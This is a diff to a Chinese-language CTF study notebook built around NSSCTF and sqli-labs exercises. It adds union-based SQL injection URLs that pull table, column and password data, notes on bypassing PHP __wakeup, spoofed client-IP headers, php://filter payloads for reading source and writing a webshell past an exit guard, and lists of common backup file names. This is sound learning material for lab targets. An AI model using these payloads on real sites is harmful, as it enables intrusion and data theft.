@@ -843,6 +843,7 @@ https://www.nssctf.cn/problem/3873
 
 ```
 ------基于错误的GET单引号字符型注入------
+
 # 查回显点
 http://127.0.0.1/sqli-labs/Less-1/?id=-1' union select 1,2,3 --+
 # 查数据库名
@@ -850,9 +851,33 @@ http://127.0.0.1/sqli-labs/Less-1/?id=-1' union select 1,2,database(); --+
 # 查表
 http://127.0.0.1/sqli-labs/Less-1/?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security'--+
 # 查列
-http://sqli-labs.bachang.org/Less-1/?id=-1' union select 1,2,group_concat(username) from information_schema.columns where table_name='users'--+
+http://sqli-labs.bachang.org/Less-1/?id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users'--+
 # 查字段
 http://sqli-labs.bachang.org/Less-1/?id=-1' union select 1,2,group_concat(password) from users--+
+
+------基于错误的GET整型注入------
+
+# 和第一种一样，除了不用闭合外
+http://127.0.0.1/sqli-labs/Less-3/?id=-1union select 1,2,3 --+
+
+------基于错误的GET单引号变形字符型注入------
+
+# 使用 ) 进行闭合，其余步骤和之前的一样
+http://127.0.0.1/sqli-labs/Less-3/?id=-1') union select 1,2,3 --+
+
+------基于错误的GET双引号字符型注入------
+
+# 参数的前后加入了双引号，在前面的基础上进行下面的操作，闭合双引号
+http://127.0.0.1/sqli-labs/Less-4/?id=-1") union select 1,2,3 --+
+
+------双注入GET单引号字符型注入------
+
+# 报错会有固定回显，可以考虑布尔型盲注、报错型注入、时间延迟型盲注，直接使用 sqlmap 即可
+
+------堆叠注入------
+
+# 堆叠注入即使用 ; 划分多个查询语句，同时执行，如果注入时发现 1 和 0 的回显不一样，则可能存在 || 的逻辑结构，
+ 
 
 
 ```
@@ -891,7 +916,7 @@ https://www.nssctf.cn/problem/429
 * 考点：反序列化,php,绕过__wakeup
 * 工具：php
 
-关于w__wakeup的绕过：
+关于**__wakeup的绕过**：
 
 先序列化字符串，然后**使序列化后字符串中属性的个数大于真实对象中属性的个数**，即可绕过__wakeup
 对于这道题：
@@ -911,6 +936,16 @@ O:6:"HaHaHa":3:{s:5:"admin";s:5:"admin";s:6:"passwd";s:4:"wllm";}
 
 将2修改为3
 
+如果成员变量不为 public，是 private ，则需要在类中进行修改
+```php
+class Name{
+    private $username = 'admin';
+    private $password = '100';
+}
+$a=new Name();
+echo serialize($a)
+```
+还需要注意序列化后的内容中的空格在构建 payload 传入参数后可能会丢失，需要使用 %00 替代空格补全
 ---
 
 ## [SWPUCTF 2022 新生赛]1z_unserialize
@@ -939,6 +974,80 @@ echo serialize($a);
 
 ---
 
+
+## 请求头中使用下面的指定来源 ip ：
+- X-Forwarded-For:127.0.0.1
+- Client-ip:127.0.0.1
+- X-Client-IP:127.0.0.1
+- X-Remote-IP:127.0.0.1
+- X-Rriginating-IP:127.0.0.1
+- X-Remote-addr:127.0.0.1
+- HTTP_CLIENT_IP:127.0.0.1
+- X-Real-IP:127.0.0.1
+- X-Originating-IP:127.0.0.1
+- via:127.0.0.1
+
+
+## 指定来源域名
+- Referer:www.XXX.com 来源域名
+---
+
+## PHP伪协议的使用：
+
+1. ile:// — 访问本地文件系统
+2. http:// — 访问 HTTP(s) 网址
+3. ftp:// — 访问 FTP(s) URLs
+4. php:// — 访问各个输入/输出流（I/O streams）
+常用：
+
+将文件编码为 base64 后输出，绕过直接执行文件：
+
+`php://filter/read=convert.base64-encode/resource=index.php`
+>利用 filter 协议读文件，将 index.php 通过 base64 编码后进行输出，这样做的好处就是如果不进行编码，文件包含后就不会有输出结果，而是当做 php 文件执行了，而通过编码后则可以读取文件源码。
+
+
+strip_tags 绕过死亡 exit
+
+`php://filter/string.strip_tags|convert.base64-decode/resource=shell.php`
+
+>这个<?php exit; ?>实际上是一个XML标签，既然是XML标签，就可以利用 strip_tags 函数去除它，而 php://filter 刚好是支持这个方法的。
+但是要写入的一句话木马也是 XML 标签，在用到 strip_tags 时也会被去除。
+注意到在写入文件的时候，filter是支持多个过滤器的。可以先将 webshell 经过 base64 编码， strip_tags 去除死亡 exit 之后，再通过 base64-decode 复原。
+
+请求类型为 POST 则**不需要**对 resource 后的地址内容添加双引号
+
+
+5. zlib:// — 压缩流
+6. data:// — 数据（RFC 2397）
+7. glob:// — 查找匹配的文件路径模式
+8. phar:// — PHP 归档
+9.  ssh2:// — Secure Shell 2
+10.  rar:// — RAR
+11.  ogg:// — 音频流
+12.  expect:// — 处理交互式的流
+
+---
+
+## 关于网站备份
+
+常见的网站源码备份文件后缀:
+
+`tar.gz，zip，rar，tar`
+
+常见的网站源码备份文件名：
+
+`web，website，backup，back，www，wwwroot，temp`
+
+---
+
+## [鹏城杯 2022]压缩包
+
+https://www.nssctf.cn/problem/2421
+
+* 考点：条件竞争，php代码审计
+* 工具：php，yakit
+
+通过审计 php 代码可以发现其逻辑是从上传的参数 content 中读取 base64 编码的内容并解码，然后将解码得到的内容存入带有上传文件 md5 值的一个临时路径 `/tmp/md5值/下` 
 
 
 
